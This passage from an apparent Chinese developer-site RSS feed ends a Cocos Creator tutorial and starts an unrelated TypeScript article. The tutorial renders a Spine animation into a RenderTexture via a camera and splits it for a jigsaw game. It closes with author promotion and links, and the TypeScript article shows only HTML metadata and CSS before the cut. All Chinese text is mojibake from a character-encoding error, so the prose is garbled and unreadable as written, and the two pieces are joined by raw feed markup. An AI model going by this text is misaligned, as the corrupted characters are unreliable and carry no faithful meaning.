<p><strong>æˆ‘ä»¬</strong>å¯ä»¥é€šè¿‡èµ„æºç®¡ç†å™¨<code>assets</code>ç›®å½•å³é”®åˆ›å»ºä¸€ä¸ªæ¸²æŸ“çº¹ç†(<code>RenderTexture</code>)ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ea3d153014d43baad593962b40c3e08~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lq_5YWD56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770166227&amp;x-signature=lIBFe9I6UFSuEI4S8XVXzZLMpiw%3D" alt="" loading="lazy"/></p>
<p><strong>è°ƒæ•´</strong>åˆé€‚çš„å¤§å°ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cee1053818b549148a04316ee5e9eef0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lq_5YWD56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770166227&amp;x-signature=C2aFjr6Koq9hZsGV4ngZ6y1UsZw%3D" alt="" loading="lazy"/></p>
<p><strong>3.åˆ›å»ºç›¸æœº</strong></p>
<p><strong>æˆ‘ä»¬</strong>éœ€è¦å€ŸåŠ©ç›¸æœºï¼ŒæŠŠç›¸æœºçš„ç”»é¢æ¸²æŸ“åˆ°æ¸²æŸ“çº¹ç†ï¼Œäºæ˜¯æˆ‘ä»¬åœ¨<code>spine</code>èŠ‚ç‚¹ä¸‹åˆ›å»ºä¸€ä¸ªï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9519e516785b441f93253d11fec6d625~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lq_5YWD56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770166227&amp;x-signature=mHw8zF1AbD5unOIiAkI8e1wxwRU%3D" alt="" loading="lazy"/></p>
<p><strong>ä¿®æ”¹</strong>ç›¸æœºçš„<code>Visibility</code>å±æ€§å»æ‰<code>DEFAULT</code>ï¼Œå¦è€…ä¼šæœ‰è­¦å‘Šã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/210722ff9ee84c3495be3eb6c03fd214~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lq_5YWD56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770166227&amp;x-signature=qN6LX1L03H6WJXZvADCX%2BIcHLlw%3D" alt="" loading="lazy"/></p>
<p><strong>ç„¶å</strong>åœ¨å±æ€§é¢æ¿è°ƒæ•´ä½ç½®ã€æ­£äº¤å¤§å°ç­‰å‚æ•°ï¼Œè®©ç›¸æœºå®Œå…¨æ‹åˆ°<code>spine</code>åŠ¨ç”»ï¼ŒæŠŠèƒŒæ™¯é¢œè‰²è®¾ç½®æˆç™½è‰²ä¾¿äºè§‚çœ‹åŒºåˆ†ã€‚</p>
<p><strong>è®¾ç½®</strong><code>Target Texture</code>ä¸ºæˆ‘ä»¬åˆšåˆ›å»ºçš„<code>RenderTexture</code>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8e2fe59c2c84513aa4823336d681ff9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lq_5YWD56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770166227&amp;x-signature=5JFwK3%2BrnsibB%2FgJOx14%2FhmyEag%3D" alt="" loading="lazy"/></p>
<p><strong>ä¸ºäº†</strong>é¿å…<code>spine</code>åŠ¨ç”»è¢«åŸç›¸æœºæ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒæ•´ä½ç½®ï¼Œå°†å®ƒç§»å‡ºåˆ°ç”»é¢å¤–ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b49815b14ef24d34bca62688469d9b31~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lq_5YWD56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770166227&amp;x-signature=56pL4Pzts7QhkEK3H%2BBvcIfCy1k%3D" alt="" loading="lazy"/></p>
<p><strong>4.åˆ›å»ºSprite</strong></p>
<p><strong>æˆ‘ä»¬</strong>å¯ä»¥ç›´æ¥æŠŠ<code>RenderTexture</code>æ‹–åˆ°åœºæ™¯ä¸­ï¼Œä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ª<code>Sprite</code>ç»„ä»¶ï¼Œå¹¶ä¸”è‡ªåŠ¨å°†<code>RenderTexture</code>ä½œä¸ºå›¾ç‰‡èµ„æºã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b22a28832efc4827bb169e63c3399fa3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lq_5YWD56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770166227&amp;x-signature=lradT3TzRVPFDntaw0y9OB%2FhFm8%3D" alt="" loading="lazy"/></p>
<p><strong>å±æ€§</strong>å¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48ba13a42c274b09a1bd31d38469d410~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lq_5YWD56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770166227&amp;x-signature=JeM58aozWuVUOWupE8XXBtVOcDQ%3D" alt="" loading="lazy"/></p>
<p><strong>5.æŸ¥çœ‹æ•ˆæœ</strong></p>
<p><strong>ç›´æ¥è¿è¡Œ</strong>å°±èƒ½çœ‹åˆ°æ•ˆæœï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7b0c49c5ccc468baaa29aa5e9177df0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lq_5YWD56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770166227&amp;x-signature=HeXQob%2B8E5FrdNewfR3RSSea8lk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">åŠ¨æ€åˆ†å‰²</h2>
<p><strong>æœ‰äº†</strong><code>SpriteFrame</code>ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥æŒ‰ç…§ä¹‹å‰åŠ¨æ€åˆ†å‰²å›¾ç‰‡çš„é€»è¾‘è¿›è¡Œåˆ†å‰²äº†ã€‚</p>
<p><strong>é¦–å…ˆ</strong>åˆ›å»ºä¸€ä¸ªè„šæœ¬ï¼Œæ‹¿åˆ°<code>Sprite</code>å¼•ç”¨ï¼Œå®šä¹‰è¡Œåˆ—æ•°å’Œé—´éš™ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f856e95a54d14692a059e756d7447c7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lq_5YWD56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770166227&amp;x-signature=WL79%2BW3Az1Dm8B4m74yxRCID9pU%3D" alt="" loading="lazy"/></p>
<p><strong>ç„¶å</strong>æŒ‰ç…§ä¹‹å‰åŠ¨æ€åˆ†å‰²æ‹¼å›¾çš„åŸç†åˆ†å‰²å³å¯ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f5a87a8eae0f4f2092aeb66a0dd8db91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lq_5YWD56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770166227&amp;x-signature=g2JvVa%2BEEodMcBXfdV4JE7oRobk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">æ•ˆæœæ¼”ç¤º</h2>
<p><strong>æœ€ç»ˆæ•ˆæœ</strong>å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°<code>spine</code>å·²ç»è¢«æˆåŠŸåˆ†å‰²ï¼Œå‰©ä¸‹æ¸¸æˆé€»è¾‘å› ä¸ºå’Œä¹‹å‰ä¸€æ ·ï¼Œæˆ‘ä»¬å°±ä¸é‡å¤äº†ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c02508c92c894562a2e7f7cc30a0bc9f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lq_5YWD56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770166227&amp;x-signature=lElBjnENmddCSsbF63rAwRk1JOA%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">ç»“è¯­</h2>
<p><strong>è¿™æ ·çš„åŠ¨æ€æ‹¼å›¾</strong>å¸‚é¢ä¸Šå¥½åƒè¿˜æ²¡æœ‰ï¼Œä¼šæˆä¸ºä¸‹ä¸€ä¸ªå˜ç§çš„æ¨¡ä»¿å¯¹è±¡å—ï¼Ÿ</p>
<p><strong>å°ä¼™ä¼´ä»¬</strong>ï¼Œä½ ä»¬éƒ½å­¦ä¼šäº†å—ï¼Ÿ</p>
<p><strong>æœ¬æ–‡å®Œæ•´æºç </strong>å¯ä»¥ç‚¹èµåé€šè¿‡ç§ä¿¡<code>puzzlespine</code>è·å–ã€‚</p>
<p><strong>æ›´å¤šå®ç”¨æºç </strong>å¯ä»¥é€šè¿‡<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FFOi5gCiGzF3LnT03DpPMXA" target="_blank" title="https://mp.weixin.qq.com/s/FOi5gCiGzF3LnT03DpPMXA" ref="nofollow noopener noreferrer">äº¿å…ƒCocoså°æ¸¸æˆå®æˆ˜åˆé›†</a>è·å–ï¼Œæ„Ÿè°¢æ”¯æŒã€‚</p>
<hr/>
<p><strong>æˆ‘æ˜¯"äº¿å…ƒç¨‹åºå‘˜"ï¼Œä¸€ä½æœ‰ç€8å¹´æ¸¸æˆè¡Œä¸šç»éªŒçš„ä¸»ç¨‹ã€‚åœ¨æ¸¸æˆå¼€å‘ä¸­ï¼Œå¸Œæœ›èƒ½ç»™åˆ°æ‚¨å¸®åŠ©, ä¹Ÿå¸Œæœ›é€šè¿‡æ‚¨èƒ½å¸®åŠ©åˆ°å¤§å®¶ã€‚</strong></p>
<p>AD:ç¬”è€…çº¿ä¸Šçš„å°æ¸¸æˆã€Šæ‰“èºä¸é—¯å…³ã€‹ã€Šè´ªåƒè›‡æŒæœºç»å…¸ã€‹ã€Šé‡åŠ›è¿·å®«çƒã€‹ã€Šå¡«è‰²ä¹‹æ—…ã€‹ã€Šæ–¹å—æŒæœºç»å…¸ã€‹å¤§å®¶å¯ä»¥è‡ªè¡Œç‚¹å‡»æœç´¢ä½“éªŒã€‚</p>
<p>å®ä¸ç›¸ç’ï¼Œæƒ³è¦ä¸ª<strong>èµ</strong>å’Œ<strong>çˆ±å¿ƒ</strong>ï¼è¯·æŠŠè¯¥æ–‡ç« <strong>åˆ†äº«</strong>ç»™ä½ è§‰å¾—æœ‰éœ€è¦çš„å…¶ä»–å°ä¼™ä¼´ã€‚è°¢è°¢ï¼</p>
<p>æ¨èæ–‡ç« ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FFOi5gCiGzF3LnT03DpPMXA" target="_blank" title="https://mp.weixin.qq.com/s/FOi5gCiGzF3LnT03DpPMXA" ref="nofollow noopener noreferrer">äº¿å…ƒCocoså°æ¸¸æˆå®æˆ˜åˆé›†</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FXLCknL3fJDubec2GW6KLFA" target="_blank" title="https://mp.weixin.qq.com/s/XLCknL3fJDubec2GW6KLFA" ref="nofollow noopener noreferrer">Cocosæ¸¸æˆå¦‚ä½•æ¥å…¥å®‰å“ç©¿å±±ç”²å¹¿å‘Šå˜ç°ï¼Ÿ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F3_VrSld4KnDKY_7hxjSoKg" target="_blank" title="https://mp.weixin.qq.com/s/3_VrSld4KnDKY_7hxjSoKg" ref="nofollow noopener noreferrer">ä½ çŸ¥é“å’Œä¸çŸ¥é“çš„å¾®ä¿¡å°æ¸¸æˆå¸¸ç”¨APIæ•´ç†ï¼Œèµ¶ç´§æ”¶è—ç”¨èµ·æ¥~</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F0Lj24VHJ-pL8z82hHqQLiA" target="_blank" title="https://mp.weixin.qq.com/s/0Lj24VHJ-pL8z82hHqQLiA" ref="nofollow noopener noreferrer">Cocosæ¸¸æˆå¦‚ä½•å¿«é€Ÿæ¥å…¥æŠ–éŸ³å°æ¸¸æˆå¹¿å‘Šå˜ç°ï¼Ÿ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FZ7DusUJA2v1IFZDFtBsueg" target="_blank" title="https://mp.weixin.qq.com/s/Z7DusUJA2v1IFZDFtBsueg" ref="nofollow noopener noreferrer">å¦‚ä½•åœ¨CocosCreator3.8ä¸­å®ç°å‰²ç»³å­æ¸¸æˆæ•ˆæœ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F3BzzFBzeVAO-a6LPTeFTrA" target="_blank" title="https://mp.weixin.qq.com/s/3BzzFBzeVAO-a6LPTeFTrA" ref="nofollow noopener noreferrer">å¦‚ä½•åœ¨CocosCreator3.8ä¸­å®ç°åŠ¨æ€åˆ‡å‰²æ¨¡å‹ï¼Ÿ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FZIph332u_r24OTY4r6_jow" target="_blank" title="https://mp.weixin.qq.com/s/ZIph332u_r24OTY4r6_jow" ref="nofollow noopener noreferrer">Cocosæ¸¸æˆå¼€å‘ä¸­çš„è´´èŠ±æ•ˆæœ</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TypeScript ç±»å‹ä½“æ“ç»ƒä¹ ç¬”è®°ï¼ˆä¸€ï¼‰]]></title>    <link>https://juejin.cn/post/7600341731048030243</link>    <guid>https://juejin.cn/post/7600341731048030243</guid>    <pubDate>2026-01-29T07:51:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600341731048030243" data-draft-id="7590054976489455656" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TypeScript ç±»å‹ä½“æ“ç»ƒä¹ ç¬”è®°ï¼ˆä¸€ï¼‰"/> <meta itemprop="keywords" content="TypeScript"/> <meta itemprop="datePublished" content="2026-01-29T07:51:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æˆ‘ä¸åƒé¥¼å¹²"/> <meta itemprop="url" content="https://juejin.cn/user/3263006241480605"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TypeScript ç±»å‹ä½“æ“ç»ƒä¹ ç¬”è®°ï¼ˆä¸€ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3263006241480605/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æˆ‘ä¸åƒé¥¼å¹²
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T07:51:51.000Z" title="Thu Jan 29 2026 07:51:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»21åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin:30px 0 10px;color:#cca152;position:relative;padding-left:50px;border-bottom:2px solid rgba(209,163,78,.6);padding-bottom:0}.markdown-body h1{font-size:30px}.markdown-body h1:before{content:"";width:50px;height:42px;display:block;position:absolute;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACcAAAAhBAMAAACo1K8bAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAFZaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJYTVAgQ29yZSA1LjQuMCI+CiAgIDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIj4KICAgICAgICAgPHRpZmY6T3JpZW50YXRpb24+MTwvdGlmZjpPcmllbnRhdGlvbj4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CkzCJ1kAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAnUExURUdwTMyhUsqkUMyhUsyiUcyhUsyhUsyhUcyhUsyhUs2hUtytWNWoVX44si8AAAAKdFJOUwD8Bfcge95QncCWSSDAAAABh0lEQVQoz2WSPUvDQBjHjyPSOB7drh2OUOs36NA6pKAFwaEo4tDFIUWxGYLgKw4BEYUuHaQg7XJ0kccsUmrT2qUUQZp8KO/y1hSfIYEf/5eHu0MoGU1+sIbSw5Bypd92S+dWWrd34b15vuOPY4QxuvtYZp0lIVk3Zgjt+5zkh12AvBHnbW85BOjXySPwhc5CYcY0OdDh5dEUqIEj4cN8Dty3a1MqYJS4MaWU5wzVLwMMxqGSNQgA/VFa4gf50yhxSUW+db8ACa2gBxfnABVDFYHCPYrc7TLwCepJM8/ZoVsRwpxdHEozHUXd6idwVzFFM5BFmIhQVQjrNdnCvdd48wblI2VHtsAZioSsTYVwLoXvjMXH1icuNgPhQE+Ot1+xi8HeA3d1Df1f1JPVUOmsYLujBjuSySqSXYt+yTwbJ0pcyIhqTrxkn0BazRLizJosxRBued+z0jPD6VewOXl5utHRGmMNK3k0iTkzxpq2/oIQO6gLprF12kT/R20eyzlcg7iwK0dPsz/ibpdsCHweWwAAAABJRU5ErkJggg==) 0 0 no-repeat;background-size:80%;bottom:-10px;left:-2px}.markdown-body h2{font-size:24px}.markdown-body h2:before{content:"";width:50px;height:42px;display:block;position:absolute;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACcAAAAhBAMAAACo1K8bAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAFZaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJYTVAgQ29yZSA1LjQuMCI+CiAgIDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIj4KICAgICAgICAgPHRpZmY6T3JpZW50YXRpb24+MTwvdGlmZjpPcmllbnRhdGlvbj4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CkzCJ1kAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAnUExURUdwTMyhUsqkUMyhUsyiUcyhUsyhUsyhUcyhUsyhUs2hUtytWNWoVX44si8AAAAKdFJOUwD8Bfcge95QncCWSSDAAAABh0lEQVQoz2WSPUvDQBjHjyPSOB7drh2OUOs36NA6pKAFwaEo4tDFIUWxGYLgKw4BEYUuHaQg7XJ0kccsUmrT2qUUQZp8KO/y1hSfIYEf/5eHu0MoGU1+sIbSw5Bypd92S+dWWrd34b15vuOPY4QxuvtYZp0lIVk3Zgjt+5zkh12AvBHnbW85BOjXySPwhc5CYcY0OdDh5dEUqIEj4cN8Dty3a1MqYJS4MaWU5wzVLwMMxqGSNQgA/VFa4gf50yhxSUW+db8ACa2gBxfnABVDFYHCPYrc7TLwCepJM8/ZoVsRwpxdHEozHUXd6idwVzFFM5BFmIhQVQjrNdnCvdd48wblI2VHtsAZioSsTYVwLoXvjMXH1icuNgPhQE+Ot1+xi8HeA3d1Df1f1JPVUOmsYLujBjuSySqSXYt+yTwbJ0pcyIhqTrxkn0BazRLizJosxRBued+z0jPD6VewOXl5utHRGmMNK3k0iTkzxpq2/oIQO6gLprF12kT/R20eyzlcg7iwK0dPsz/ibpdsCHweWwAAAABJRU5ErkJggg==) 0 0 no-repeat;background-size:70%;bottom:-15px;left:-1px}.markdown-body h3{font-size:18px}.markdown-body h3:before{content:"";width:50px;height:42px;display:block;position:absolute;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACcAAAAhBAMAAACo1K8bAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAFZaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJYTVAgQ29yZSA1LjQuMCI+CiAgIDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIj4KICAgICAgICAgPHRpZmY6T3JpZW50YXRpb24+MTwvdGlmZjpPcmllbnRhdGlvbj4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CkzCJ1kAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAnUExURUdwTMyhUsqkUMyhUsyiUcyhUsyhUsyhUcyhUsyhUs2hUtytWNWoVX44si8AAAAKdFJOUwD8Bfcge95QncCWSSDAAAABh0lEQVQoz2WSPUvDQBjHjyPSOB7drh2OUOs36NA6pKAFwaEo4tDFIUWxGYLgKw4BEYUuHaQg7XJ0kccsUmrT2qUUQZp8KO/y1hSfIYEf/5eHu0MoGU1+sIbSw5Bypd92S+dWWrd34b15vuOPY4QxuvtYZp0lIVk3Zgjt+5zkh12AvBHnbW85BOjXySPwhc5CYcY0OdDh5dEUqIEj4cN8Dty3a1MqYJS4MaWU5wzVLwMMxqGSNQgA/VFa4gf50yhxSUW+db8ACa2gBxfnABVDFYHCPYrc7TLwCepJM8/ZoVsRwpxdHEozHUXd6idwVzFFM5BFmIhQVQjrNdnCvdd48wblI2VHtsAZioSsTYVwLoXvjMXH1icuNgPhQE+Ot1+xi8HeA3d1Df1f1JPVUOmsYLujBjuSySqSXYt+yTwbJ0pcyIhqTrxkn0BazRLizJosxRBued+z0jPD6VewOXl5utHRGmMNK3k0iTkzxpq2/oIQO6gLprF12kT/R20eyzlcg7iwK0dPsz/ibpdsCHweWwAAAABJRU5ErkJggg==) 0 0 no-repeat;background-size:60%;bottom:-19px;left:-2px}.markdown-body h4{font-size:16px;padding-left:0;border-bottom:1px solid rgba(209,163,78,.6)}.markdown-body h5{font-size:15px;padding-left:0}.markdown-body em{color:#cca152}.markdown-body del{text-decoration-color:#cca152;text-decoration-thickness:2px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:80%;margin:6px auto;box-shadow:0 6px 15px #8e8e8e;display:block;margin:20px auto!important;object-fit:contain;border-radius:8px}.markdown-body hr{border:none;border-top:2px solid #e0c9a1;margin-top:32px 0}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background:#f6efde;color:#b69454;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Mono,Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;background:#fef6e1;border-radius:4px;box-shadow:0 0 8px hsla(0,0%,47%,.45)}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAOCAMAAABaWb9VAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAFZaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJYTVAgQ29yZSA1LjQuMCI+CiAgIDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIj4KICAgICAgICAgPHRpZmY6T3JpZW50YXRpb24+MTwvdGlmZjpPcmllbnRhdGlvbj4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CkzCJ1kAAAAJcEhZcwAADsQAAA7EAZUrDhsAAACHUExURUdwTMxCKdc8NvdYT/9hVyLJPABBAGubKNiIOv+/K+ytJBakH9aZG+5QR5VZDOBDPhmtJ8+VGuGjH/CwJR26MR6+NBq0LPW1KBmwKetNRfJUTONHP92fHuSmIeFEPhu3LR29M/BTS+mqIuqsI5qdHyLKPP++Kv9gVf9lW//KLSXXQCTQP//FLMVm5KQAAAAldFJOUwAlPPz7+woBBPu8Mzu+FlRRKmvnweeG+Wqg6mVNXmuc1OCbmjZJWF/9AAABKklEQVQoz3WS6XaCMBCFRzAM++KGsqhtDwES3//5OtmA2uP9A9zwzRoAgBC0QgQrdA68OZsDr229YGHoIEj7Pl0ZOgjKa5lYJ4Rd1vijn3nuD4Qurjmv48o6RFyfbGDnS6DeEXZfk5ZfuBhdPb9I87ECNMh1EFJKIU6agWzaa01NbmLkx